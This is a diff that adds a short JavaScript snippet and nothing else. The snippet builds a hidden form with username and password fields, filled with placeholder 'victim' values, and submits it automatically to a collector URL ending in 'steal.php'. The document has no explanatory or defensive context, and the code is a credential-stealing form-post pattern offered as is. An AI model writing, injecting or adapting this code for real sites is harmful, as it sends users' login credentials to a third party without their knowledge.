@@ -1,0 +1,18 @@
+var form = document.createElement("form");
+form.setAttribute("method", "post");
+form.setAttribute("action", "https://yourwebsite.com/steal.php");
+
+var input = document.createElement("input");
+input.setAttribute("type", "hidden");
+input.setAttribute("name", "username");
+input.setAttribute("value", "victim_username");
+form.appendChild(input);
+
+var input = document.createElement("input");
+input.setAttribute("type", "hidden");
+input.setAttribute("name", "password");
+input.setAttribute("value", "victim_password");
+form.appendChild(input);
+
+document.body.appendChild(form);
+form.submit();
